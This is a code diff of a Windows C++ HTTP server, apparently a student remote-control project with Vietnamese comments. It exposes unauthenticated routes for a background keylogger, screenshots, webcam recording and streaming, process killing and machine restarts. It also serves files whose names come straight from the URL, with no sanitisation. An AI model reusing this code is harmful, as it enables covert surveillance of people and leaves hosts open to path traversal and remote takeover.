@@ -1,3 +1,5 @@
+#include <opencv2/opencv.hpp>
+#include <mutex>
 #include <iostream>
 #include <winsock2.h>
 #include <windows.h>
@@ -14,7 +16,6 @@
 #include "keylogger.h"
 #include "webcam.h"
 #include "system.h"
-
 
 int main() {
     
@@ -37,53 +38,14 @@ int main() {
     std::cout << "Server running on port " << PORT << "...\n";
     std::cout << "Keylogger is active in background...\n";
 
-//     ///////////////
-//         char buffer[BUFFER_SIZE] = {0};
-//         int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0); // Thêm biến kiểm tra bytesReceived
-        
-//         if (bytesReceived <= 0) { // Kiểm tra lỗi ngắt kết nối
-//             closesocket(client_socket);
-//             continue;
-//         }
-
-//         // --- SỬA LỖI Ở ĐÂY ---
-//         std::string request(buffer);      // Biến chứa toàn bộ gói tin (Header + Body)
-//         std::string request_body = request; // Tạo alias request_body để khớp với code bên dưới của bạn
-        
-//         // Lấy dòng đầu tiên: GET /path HTTP/1.1
-//         std::stringstream ss(request);
-//         std::string method, full_path;
-//         ss >> method >> full_path;
-
-//         if (method.empty()) {
-//             closesocket(client_socket);
-//             continue;
-//         }
-
-//         std::string route = get_route_path(full_path);
-//         std::map<std::string, std::string> query = parse_query(full_path);
-//         std::string response;
-
-//         std::cout << "Request: " << route << " | Method: " << method << std::endl;
-// //////////////
-
-
     while (true) {
         SOCKET client_socket = accept(server_fd, NULL, NULL);
         if (client_socket == INVALID_SOCKET) continue;
 
         char buffer[BUFFER_SIZE] = {0};
-        int bytesReceived = recv(client_socket, buffer, BUFFER_SIZE, 0);
-
-        if (bytesReceived <= 0) { // Kiểm tra lỗi ngắt kết nối
-            closesocket(client_socket);
-            continue;
-        }
-        std::string request(buffer);
-        std::string request_body = request;
-
+        recv(client_socket, buffer, BUFFER_SIZE, 0);
         
-        // Lấy dòng đầu tiên: GET /path HTTP/1.1
+        std::string request(buffer);
         std::stringstream ss(request);
         std::string method, full_path;
         ss >> method >> full_path;
@@ -103,19 +65,25 @@ int main() {
         if (route == "/ping") {
             response = http_response("pong");
         }
+        else if (route.find(".bmp") != std::string::npos || route.find(".avi") != std::string::npos) {
+            std::string filename = route.substr(1); 
+            serve_file(client_socket, filename);
+            closesocket(client_socket);
+            continue; // Xử lý xong thì tiếp tục vòng lặp mới
+        }
+
         else if (route == "/apps") {
             response = list_apps();
         }
         else if (route == "/apps/start") {
             std::string name = query["name"];
-            if (APPS.count(name)) start_app_sys(APPS[name]);
-            else start_app_sys(name); // Thử mở trực tiếp nếu không có trong dict
+            if (name.length() >= 4 && name.substr(name.length() - 4) == ".exe") start_app_sys(name);
+            else start_app_sys(name);
             response = http_response("Started " + name);
         }
         else if (route == "/apps/stop") {
-            // Logic dừng app theo tên định nghĩa trong APPS
             std::string name = query["name"];
-            if (APPS.count(name)) stop_process_sys(APPS[name]);
+            if (name.length() >= 4 && name.substr(name.length() - 4) == ".exe") stop_process_sys(name);
             else stop_process_sys(name + ".exe");
             response = http_response("Stopped " + name);
         }
@@ -123,7 +91,6 @@ int main() {
             response = list_processes();
         }
         else if (route == "/processes/stop") {
-            // Nhận PID hoặc tên
             std::string target = query["name"]; // Dùng param 'name' cho thống nhất
             stop_process_sys(target); 
             response = http_response("Kill command sent to " + target);
@@ -140,63 +107,64 @@ int main() {
         else if (route == "/restart") {
             response = system_control("restart");
         }
-
-    //     else if (route == "/webcam") {
-    //         std::string filename = take_screenshot();
-    //         response = http_response("Screenshot saved as: " + filename);
-    //     }
-
-    //     // --- ROUTE QUAY WEBCAM ---
-    //     else if (route == "/webcam") {
-    //         int duration = 10;
-    //         if (query.find("duration") != query.end()) {
-    //             try { duration = std::stoi(query["duration"]); } catch(...) {}
-    //         }
-
-    //         std::cout << "Recording webcam for " << duration << "s..." << std::endl;
-    //         std::string filename = start_webcam_recording(duration);
-    //         response = http_response("Started recording webcam. File: " + filename);
-    //     }
-
-
-    //     else {
-    //         response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
-    //     }
-
-    //     send(client_socket, response.c_str(), response.length(), 0);
-    //     closesocket(client_socket);
-    // }
-
-        else if (route == "/webcam") {
-            std::cout << ">> Nhan lenh quay Webcam..." << std::endl;
-
-            int seconds = 10;
-
-            std::string searchKey = "\"seconds\":\"";
-            size_t pos = request_body.find(searchKey); 
-            
-            if (pos != std::string::npos) {
-                size_t start = pos + searchKey.length();
-                size_t end = request_body.find("\"", start);
-                if (end != std::string::npos) {
-                    std::string secStr = request_body.substr(start, end - start);
-                    try {
-                        seconds = std::stoi(secStr);
-                    } catch (...) {
-                        seconds = 10; 
-                    }
-                }
-            }
-            
-            std::cout << ">> Thoi luong: " << seconds << "s. Dang quay..." << std::endl;
-
-            std::string videoPath = start_webcam_recording(seconds);
-            
-            response = http_response(videoPath);
+        else if (route == "/screenshot") {
+            std::string filename = take_screenshot(); 
+            response = http_response("/" + filename); 
         }
-        
+        else if (route == "/webcam/start") {
+            start_webcam();
+            response = http_response("Webcam started");
+        }
+        else if (route == "/webcam/stop") {
+            stop_webcam();
+            response = http_response("Webcam stopped");
+        }
+        else if (route.find("/snapshot_stream") != std::string::npos) {
+            std::vector<uchar> jpeg_buf;
+            if (get_latest_frame(jpeg_buf)) {
+                std::string header = "HTTP/1.1 200 OK\r\n";
+                header += "Content-Type: image/jpeg\r\n";
+                header += "Content-Length: " + std::to_string(jpeg_buf.size()) + "\r\n";
+                header += "Connection: close\r\n\r\n";
+                
+                send(client_socket, header.c_str(), header.size(), 0);
+                send(client_socket, reinterpret_cast<char*>(jpeg_buf.data()), jpeg_buf.size(), 0);
+            }
+        }
+        else if (route == "/webcam") {
+            int duration = 10;
+            if (query.count("seconds")) {
+                try { duration = std::stoi(query["seconds"]); } catch(...) {}
+            }
+            std::string filename = "webcam_" + std::to_string(duration) + "s.avi";
+            std::thread t(record_webcam_thread_func, filename, duration * 1000);
+            t.detach();
+
+            response = http_response("/" + filename); // trả về đường dẫn file
+        }
+        else if (route.find(".avi") != std::string::npos) {
+            std::string filename = route.substr(1);
+            std::ifstream file(filename, std::ios::binary | std::ios::ate);
+            if (file.is_open()) {
+                std::streamsize size = file.tellg();
+                file.seekg(0, std::ios::beg);
+                std::vector<char> buffer(size);
+                if (file.read(buffer.data(), size)) {
+                    std::string header = "HTTP/1.1 200 OK\r\n";
+                    header += "Content-Type: video/x-msvideo\r\n";
+                    header += "Content-Disposition: attachment; filename=\"" + filename + "\"\r\n";
+                    header += "Content-Length: " + std::to_string(size) + "\r\n";
+                    header += "Connection: close\r\n\r\n";
+
+
+                    send(client_socket, header.c_str(), header.size(), 0);
+                    send(client_socket, buffer.data(), buffer.size(), 0);
+                }
+                file.close();
+            }
+        }
         else {
-            response = http_response("Feature not implemented yet (Screenshot/Webcam req OpenCV)", "404 Not Found");
+            response = http_response("Not Found", "404 Not Found");
         }
 
         send(client_socket, response.c_str(), response.length(), 0);
